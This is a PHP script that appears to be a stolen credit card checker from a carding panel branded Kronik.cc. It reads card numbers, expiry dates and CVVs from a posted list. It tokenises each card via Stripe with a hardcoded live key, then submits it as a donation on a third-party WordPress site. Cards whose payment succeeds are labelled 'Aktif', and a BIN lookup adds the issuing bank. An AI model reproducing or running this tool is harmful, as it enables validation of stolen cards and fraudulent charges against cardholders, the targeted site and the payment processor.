<?php

include "../../server/authcontrol.php";

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = htmlspecialchars($_POST['lista']);
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

switch ($mes) {
    case "1":
      $mes = '01';
        break;
    case "2":
      $mes = '02';
        break;
            case "3":
      $mes = '03';
        break;
            case "4":
      $mes = '04';
        break;
            case "5":
      $mes = '05';
        break;
      case "6":
      $mes = '06';
        break;
      case "7":
      $mes = '07';
        break;
      case "8":
      $mes = '08';
        break;
      case "9":
      $mes = '09';
        break;
    }
    
    switch ($ano) {
    case "20":
      $ano = '2020';
        break;
    case "21":
      $ano = '2021';
        break;
            case "22":
      $ano = '2022';
        break;
            case "23":
      $ano = '2023';
        break;
            case "24":
      $ano = '2024';
        break;
            case "25":
      $ano = '2025';
        break;
      case "26":
      $ano = '2026';
        break;
      case "27":
      $ano = '2027';
        break;
      case "28":
      $ano = '2028';
        break;
      case "29":
      $ano = '2029';
        break;
    }
    
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}


$name = rand('a, z');
$lastn = rand('a, z');
$email = rand("bambixkloe");
$email2 = rand("gmail.com", "outlook.com", "yahoo.com", "proton.com", "zoho.com");
$zip = rand(10001, 90045);
$otro = rand(0, 999999);

$bm = curl_init();
curl_setopt($bm, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($bm, CURLOPT_USERAGENT, $SERVER['HTTPS_USER_AGENT']);
curl_setopt($bm, CURLOPT_HEADER, 0);
curl_setopt($bm, CURLOPT_HTTPHEADER, array(
  'Host: api.stripe.com',
  'accept: application/json',
  'accept-language: es-US,es-419;q=0.9,es;q=0.8,en;q=0.7,ko;q=0.6,ca;q=0.5',
  'accept-encoding: gzip, deflate, br',
  'save-data: on',
  'user-agent: Mozilla/5.0 (Linux; Android 11; SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
  'origin: https://js.stripe.com',
  'referer: https://js.stripe.com/',
  'sec-fetch-site: same-site',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  ));
  curl_setopt($bm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($bm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($bm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=86efcb32-d58d-4b49-9b8f-56f39740a69366f4cc&muid=26bfc9a6-95cf-4a8b-9d30-a28c32fc1c3ed66715&sid=a06269c5-4777-4903-a0ec-3b6ef9761ab503fd38&payment_user_agent=stripe.js%2Ffb918da46%3B+stripe-js-v3%2Ffb918da46&time_on_page=246715&key=pk_live_QB3JHShzr4COf43YQwKnPqIV00mCe1EXuH&pasted_fields=number');

$bambi1 = curl_exec($bm);
curl_close($bm);

$json = json_encode($bambi1);
$veri = str_replace("\\n","",$json);
$veri2 = str_replace("\\","",$veri);
$veri3 = substr("$veri2", 2, 38);
$veri4 =  substr("$veri3", -29);
$veri5 = str_replace('"',"",$veri4);


$bm = curl_init();
curl_setopt($bm, CURLOPT_URL, 'https://www.marbellahybrid.com/wp-admin/admin-ajax.php');
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_USERAGENT, $SERVER['HTTPS_USER_AGENT']);
curl_setopt($bm, CURLOPT_HEADER, 0);
curl_setopt($bm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($bm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($bm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_HTTPHEADER, array(
  'Host: www.marbellahybrid.com',
  'accept: application/json, text/javascript, */*; q=0.01',
  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
  'accept-encoding: gzip, deflate, br',
  'accept-language: es-US,es-419;q=0.9,es;q=0.8,en;q=0.7,ko;q=0.6,ca;q=0.5',
  'user-agent: Mozilla/5.0 (Linux; Android 11; SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
  'x-requested-with: XMLHttpRequest',
  'save-data: on',
  'origin: https://www.marbellahybrid.com',
  'referer: https://www.marbellahybrid.com/donate/',
  'sec-fetch-site: same-origin',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  ));
curl_setopt($bm, CURLOPT_POSTFIELDS, 'action=formcraft3_form_submit&field7=&field1%5B%5D=Bambi&field2%5B%5D=Kloe&field3=its8019e%40gmail.com&field17%5B%5D=2&field16=&field12=2&stripe-coupon=&stripe_token='.$veri5.'&website=&id=9&location=https%3A%2F%2Fwww.marbellahybrid.com%2Fdonate%2F&emails=&hidden=&redirect=&type=all&triggerIntegration=undefined&fieldLabels=undefined&formcraft3_wpnonce=undefined');

$bambi2 = curl_exec($bm);
curl_close($bm);

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$banco = getStr($fim, '"bank":{"name":"', '"');
$pais = getStr($fim, '"name":"', '"');
$nivel = getStr($fim, '"brand":"', '"');


 if(strpos($fim, '"type":"credit"') !== false) {
  $bin = 'Credit';
} else {
  $bin = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////
if(strpos($bambi2, '/donate/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Aktif</span> - </span> </span> <span class="badge badge-success">'.$lista.'</span> - <span class="badge badge-info"> ✅ ÖDEME İŞLEMİ TAMAMLANDI</span> -</span> <span class="badge badge-info">'.$bin.' Card - Kronik.cc</span> </br>';
}
elseif($bin == 'Debit') {
    echo '<span class="badge badge-danger">#Red</span> '.$lista.' ⚠️ DEBIT KART CHECKLEMEK YASAK! - Kronik.cc';
    exit();
}
else {
    echo '<span class="badge badge-danger">#Red</span> - </span> <span class="badge badge-danger">'.$lista.'</span> - <span class="badge badge-info"> ❌ ÖN PROVİZYON ÇEKİLEMEDİ</span> -</span> <span class="badge badge-info">'.$bin.' Card - Kronik.cc</span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\
?>